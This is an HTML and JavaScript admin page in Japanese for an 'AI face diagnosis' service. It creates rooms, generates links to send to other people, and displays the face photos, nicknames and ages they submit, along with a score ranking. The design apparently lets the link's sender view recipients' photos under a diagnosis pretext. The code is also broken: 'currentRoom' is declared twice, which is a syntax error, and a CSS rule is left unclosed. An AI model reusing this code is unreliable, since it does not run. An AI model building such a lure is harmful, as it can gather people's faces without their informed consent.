```html
<!DOCTYPE html>
<html lang="ja">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>AI顔診断｜ルーム管理</title>

<style>
* {
  box-sizing: border-box;
}

body {
  margin: 0;
  padding: 20px;
  min-height: 100vh;
  font-family:
    -apple-system,
    BlinkMacSystemFont,
    "Segoe UI",
    sans-serif;
  background:
    linear-gradient(
      135deg,
      #111827,
      #312e81,
      #581c87
    );
  color: #222;
}

.container {
  width: 100%;
  max-width: 650px;
  margin: 0 auto;
  background: white;
  padding: 25px;
  border-radius: 24px;
  box-shadow:
    0 10px 40px
    rgba(0,0,0,.35);
}

h1 {
  margin-top: 0;
  text-align: center;
}

h2 {
  margin-top: 0;
}

button {
  width: 100%;
  padding: 15px;
  margin-top: 12px;
  border: none;
  border-radius: 12px;
  background: #111827;
  color: white;
  font-size: 16px;
  font-weight: bold;
  cursor: pointer;
}

button:disabled {
  background: #aaa;
}

.primary {
  background:
    linear-gradient(
      135deg,
      #4f46e5,
      #9333ea
    );
}

.secondary {
  background: #374151;
}

.section {
  margin-top: 20px;
  padding: 20px;
  background: #f5f5f7;
  border-radius: 18px;
}

.roomId {
  margin-top: 10px;
  padding: 13px;
  background: white;
  border-radius: 10px;
  font-family: monospace;

  font-size: 18px;
  word-break: break-all;
}

.roomLink {
  margin-top: 10px;
  padding: 13px;

.status {
  margin-top: 15px;

  white-space: pre-wrap;

}

.success {
  background: #dcfce7;
  color: #166534;
}

.error {
  background: #fee2e2;
  color: #991b1b;
}

.hidden {
  display: none !important;
}

.photoGrid {
  display: grid;
  grid-template-columns:
    repeat(
      auto-fit,
      minmax(150px, 1fr)
    );
  gap: 15px;
  margin-top: 15px;
}

.photoCard {
  background: white;
  border-radius: 15px;
  padding: 10px;
  overflow: hidden;
}

.photoCard img {
  width: 100%;
  aspect-ratio: 1 / 1;
  object-fit: cover;
  border-radius: 10px;
  cursor: pointer;
}

.photoName {
  margin-top: 8px;
  font-weight: bold;
}

.photoInfo {
  margin-top: 4px;
  font-size: 12px;
  color: #666;
  line-height: 1.5;
}

.empty {
  margin-top: 15px;
  padding: 30px 15px;
  text-align: center;
  background: white;
  border-radius: 15px;
  color: #777;
}

.rankItem {
  display: flex;
  align-items: center;
  gap: 10px;
  margin-top: 10px;
  padding: 13px;
  background: #f5f5f7;
  border-radius: 12px;
}

.rankNumber {
  min-width: 42px;
  font-weight: bold;
}

.rankName {
  flex: 1;
  min-width: 0;
}

.rankAge {
  font-size: 12px;
  color: #777;
}

.rankScore {
  font-size: 20px;
  font-weight: bold;
  color: #4f46e5;
}

.modal {
  position: fixed;
  inset: 0;
  z-index: 1000;
  display: none;
  align-items: center;
  justify-content: center;
  padding: 20px;
  background: rgba(0,0,0,.85);
}

.modal.show {
  display: flex;
}

.modal img {
  max-width: 100%;
  max-height: 75vh;
  border-radius: 15px;
}

.modalBox {
  width: 100%;
  max-width: 700px;
  text-align: center;
}

.small {
  font-size: 12px;
  color: #777;
  line-height: 1.5;
}
</style>
</head>

<body>

<div class="container">

<h1>📷 AI顔診断</h1>


<!-- =================================
     ルーム作成
================================= -->

<div class="section">

<h2>🔗 写真受信用ルームを作成</h2>

<p>
ルームを作成すると、相手に送るための
AI顔診断リンクが発行されます。
</p>

<button
  id="createRoomButton"
  class="primary"
>
新しいルームを作成
</button>


<div
  id="createdArea"
  class="hidden"
>

<p>
<strong>ルームID</strong>
</p>

<div
  id="roomId"
  class="roomId"
></div>


<p>
<strong>📱 AI顔診断リンク</strong>
</p>

<div
  id="roomLink"
  class="roomLink"
></div>


<button
  id="copyButton"
  class="primary"
>
📋 リンクをコピー
</button>


<button
  id="openButton"
  class="secondary"
>
🚀 AI顔診断を開く
</button>


</div>


<div
  id="createStatus"
  class="status hidden"
></div>

</div>


<!-- =================================
     ルーム写真
================================= -->

<div
  id="roomArea"
  class="section hidden"
>

<h2>
📷 受信した写真
</h2>


<div>
<strong>ルームID：</strong>
</div>

<div
  id="currentRoom"
  class="roomId"
></div>


<button
  id="refreshPhotosButton"
  class="primary"
>
🔄 写真を更新
</button>


<div
  id="photoStatus"
  class="status"
>
写真を確認しています…
</div>


<div
  id="photoGrid"
  class="photoGrid"
></div>


<div
  id="emptyPhotos"
  class="empty hidden"
>
まだ写真は送信されていません。
</div>

</div>


<!-- =================================
     ランキング
================================= -->

<div class="section">

<h2>
🏆 グローバルランキング
</h2>

<p class="small">
ランキングへの登録に同意した診断結果のみ表示されます。
</p>


<button
  id="refreshRankingButton"
  class="secondary"
>
🔄 ランキングを更新
</button>


<div
  id="rankingStatus"
  class="status"
>
ランキングを読み込んでいます…
</div>


<div
  id="rankingList"
></div>

</div>

</div>


<!-- =================================
     写真拡大
================================= -->

<div
  id="modal"
  class="modal"
>

<div class="modalBox">

<img
  id="modalImage"
  alt="拡大写真"
>


<button
  id="closeModalButton"
  class="primary"
>
閉じる
</button>

</div>

</div>


<script>

/* =================================
   Supabase
================================= */

const PHOTO_RECEIVER_URL =
  "https://crdvhjtoxqeuttrnhfhj.supabase.co/functions/v1/photo-receiver";


/* =================================
   AI顔診断サイト
================================= */

const DIAGNOSIS_URL =
  "https://gaffney16445.github.io/ai-face-diagnosis/";


/* =================================
   DOM
================================= */

const createRoomButton =
  document.getElementById(
    "createRoomButton"
  );

const createdArea =
  document.getElementById(
    "createdArea"
  );

const roomIdElement =
  document.getElementById(
    "roomId"
  );

const roomLinkElement =
  document.getElementById(
    "roomLink"
  );

const copyButton =
  document.getElementById(
    "copyButton"
  );

const openButton =
  document.getElementById(
    "openButton"
  );

const createStatus =
  document.getElementById(
    "createStatus"
  );

const roomArea =
  document.getElementById(
    "roomArea"
  );

const currentRoom =
  document.getElementById(
    "currentRoom"
  );

const refreshPhotosButton =
  document.getElementById(
    "refreshPhotosButton"
  );

const photoStatus =
  document.getElementById(
    "photoStatus"
  );

const photoGrid =
  document.getElementById(
    "photoGrid"
  );

const emptyPhotos =
  document.getElementById(
    "emptyPhotos"
  );

const refreshRankingButton =
  document.getElementById(
    "refreshRankingButton"
  );

const rankingStatus =
  document.getElementById(
    "rankingStatus"
  );

const rankingList =
  document.getElementById(
    "rankingList"
  );

const modal =
  document.getElementById(
    "modal"
  );

const modalImage =
  document.getElementById(
    "modalImage"
  );

const closeModalButton =
  document.getElementById(
    "closeModalButton"
  );


/* =================================
   URLからroom取得
================================= */

const params =
  new URLSearchParams(
    window.location.search
  );

let currentRoom =
  params.get("room") || "";


/* =================================
   Room ID
================================= */

function generateRoomId() {

  const characters =
    "abcdefghijklmnopqrstuvwxyz0123456789";

  let result = "";

  for (
    let i = 0;
    i < 8;
    i++
  ) {

    result +=
      characters[
        Math.floor(
          Math.random() *
          characters.length
        )
      ];

  }

  return result;

}


/* =================================
   AI顔診断リンク生成
================================= */

function createDiagnosisLink(
  room
) {

  return (
    DIAGNOSIS_URL +
    "?room=" +
    encodeURIComponent(
      room
    )
  );

}


/* =================================
   ステータス
================================= */

function setStatus(
  element,
  text,
  type
) {

  element.textContent =
    text;

  element.className =
    "status";

  if (type) {

    element.classList.add(
      type
    );

  }

}


/* =================================
   ルーム作成
================================= */

createRoomButton.addEventListener(
  "click",
  () => {

    currentRoom =
      generateRoomId();


    const link =
      createDiagnosisLink(
        currentRoom
      );


    roomIdElement.textContent =
      currentRoom;


    roomLinkElement.textContent =
      link;


    createdArea.classList.remove(
      "hidden"
    );


    setStatus(
      createStatus,
      "ルームを作成しました。",
      "success"
    );


    /*
      作成したルームも
      すぐに確認できるようにする
    */

    roomArea.classList.remove(
      "hidden"
    );


    currentRoomElement.textContent =
      currentRoom;


    loadPhotos();

  }
);


/* =================================
   ここはcurrentRoomElementを
   別名で取得
================================= */

const currentRoomElement =
  document.getElementById(
    "currentRoom"
  );


/* =================================
   リンクコピー
================================= */

copyButton.addEventListener(
  "click",
  async () => {

    const link =
      roomLinkElement.textContent;


    try {

      await navigator.clipboard.writeText(
        link
      );


      setStatus(
        createStatus,
        "✅ AI顔診断リンクをコピーしました。",
        "success"
      );


    } catch (error) {

      window.prompt(
        "このリンクをコピーしてください。",
        link
      );

    }

  }
);


/* =================================
   AI顔診断を開く
================================= */

openButton.addEventListener(
  "click",
  () => {

    if (!currentRoom) {
      return;
    }


    window.location.href =
      createDiagnosisLink(
        currentRoom
      );

  }
);


/* =================================
   写真取得
================================= */

async function loadPhotos() {

  if (!currentRoom) {

    return;

  }


  setStatus(
    photoStatus,
    "📷 写真を読み込んでいます…"
  );


  photoGrid.innerHTML =
    "";


  emptyPhotos.classList.add(
    "hidden"
  );


  try {

    const url =
      PHOTO_RECEIVER_URL +
      "?room=" +
      encodeURIComponent(
        currentRoom
      );


    const response =
      await fetch(
        url
      );


    const text =
      await response.text();


    let data;


    try {

      data =
        JSON.parse(
          text
        );

    } catch (error) {

      throw new Error(
        "サーバーの応答を読み込めませんでした。\n" +
        text
      );

    }


    if (!response.ok) {

      throw new Error(
        data.error ||
        "写真取得に失敗しました。"
      );

    }


    const photos =
      Array.isArray(
        data.photos
      )
        ? data.photos
        : [];


    if (
      photos.length ===
      0
    ) {

      setStatus(
        photoStatus,
        "このルームにはまだ写真がありません。"
      );


      emptyPhotos.classList.remove(
        "hidden"
      );


      return;

    }


    setStatus(
      photoStatus,
      photos.length +
      "枚の写真を表示しています。",
      "success"
    );


    photos.forEach(
      photoData => {

        createPhotoCard(
          photoData
        );

      }
    );


  } catch (error) {

    console.error(
      error
    );


    setStatus(
      photoStatus,
      "写真を取得できませんでした。\n\n" +
      error.message,
      "error"
    );

  }

}


/* =================================
   写真カード
================================= */

function createPhotoCard(
  photoData
) {

  const card =
    document.createElement(
      "div"
    );

  card.className =
    "photoCard";


  const image =
    document.createElement(
      "img"
    );


  image.src =
    photoData.photo_url;


  image.alt =
    photoData.nickname ||
    "写真";


  image.addEventListener(
    "click",
    () => {

      modalImage.src =
        photoData.photo_url;

      modal.classList.add(
        "show"
      );

    }
  );


  const name =
    document.createElement(
      "div"
    );


  name.className =
    "photoName";


  name.textContent =
    photoData.nickname ||
    "名無し";


  const info =
    document.createElement(
      "div"
    );


  info.className =
    "photoInfo";


  if (
    photoData.age !==
    null &&
    photoData.age !==
    undefined
  ) {

    info.textContent =
      "年齢：" +
      photoData.age;

  }


  if (
    photoData.created_at
  ) {

    info.textContent +=
      "\n" +
      new Date(
        photoData.created_at
      ).toLocaleString(
        "ja-JP"
      );

  }


  card.appendChild(
    image
  );


  card.appendChild(
    name
  );


  card.appendChild(
    info
  );


  photoGrid.appendChild(
    card
  );

}


/* =================================
   写真更新
================================= */

refreshPhotosButton.addEventListener(
  "click",
  () => {

    loadPhotos();

  }
);


/* =================================
   ランキング取得
================================= */

async function loadRanking() {

  setStatus(
    rankingStatus,
    "🏆 ランキングを読み込んでいます…"
  );


  rankingList.innerHTML =
    "";


  try {

    const response =
      await fetch(
        PHOTO_RECEIVER_URL +
        "?ranking=true"
      );


    const text =
      await response.text();


    let data;


    try {

      data =
        JSON.parse(
          text
        );

    } catch (error) {

      throw new Error(
        "ランキングデータを読み込めませんでした。\n" +
        text
      );

    }


    if (!response.ok) {

      throw new Error(
        data.error ||
        "ランキング取得に失敗しました。"
      );

    }


    const rankings =
      Array.isArray(
        data.rankings
      )
        ? data.rankings
        : [];


    if (
      rankings.length ===
      0
    ) {

      setStatus(
        rankingStatus,
        "まだランキングデータがありません。"
      );

      return;

    }


    setStatus(
      rankingStatus,
      rankings.length +
      "件のランキングを表示しています。",
      "success"
    );


    rankings.forEach(
      (
        item,
        index
      ) => {

        const row =
          document.createElement(
            "div"
          );


        row.className =
          "rankItem";


        const number =
          document.createElement(
            "div"
          );


        number.className =
          "rankNumber";


        number.textContent =
          (index + 1) +
          "位";


        const name =
          document.createElement(
            "div"
          );


        name.className =
          "rankName";


        const nameText =
          document.createElement(
            "div"
          );


        nameText.textContent =
          item.nickname ||
          "名無し";


        nameText.style.fontWeight =
          "bold";


        name.appendChild(
          nameText
        );


        if (
          item.age !==
          null &&
          item.age !==
          undefined
        ) {

          const age =
            document.createElement(
              "div"
            );


          age.className =
            "rankAge";


          age.textContent =
            "年齢：" +
            item.age;


          name.appendChild(
            age
          );

        }


        const score =
          document.createElement(
            "div"
          );


        score.className =
          "rankScore";


        score.textContent =
          item.score +
          "点";


        row.appendChild(
          number
        );


        row.appendChild(
          name
        );


        row.appendChild(
          score
        );


        rankingList.appendChild(
          row
        );

      }
    );


  } catch (error) {

    console.error(
      error
    );


    setStatus(
      rankingStatus,
      "ランキングを取得できませんでした。\n\n" +
      error.message,
      "error"
    );

  }

}


/* =================================
   ランキング更新
================================= */

refreshRankingButton.addEventListener(
  "click",
  () => {

    loadRanking();

  }
);


/* =================================
   モーダル
================================= */

closeModalButton.addEventListener(
  "click",
  () => {

    modal.classList.remove(
      "show"
    );

    modalImage.src =
      "";

  }
);


modal.addEventListener(
  "click",
  event => {

    if (
      event.target ===
      modal
    ) {

      modal.classList.remove(
        "show"
      );

      modalImage.src =
        "";

    }

  }
);


/* =================================
   初期化
================================= */

if (
  currentRoom
) {

  roomArea.classList.remove(
    "hidden"
  );


  currentRoomElement.textContent =
    currentRoom;


  loadPhotos();

}


loadRanking();

</script>

</body>
</html>
```
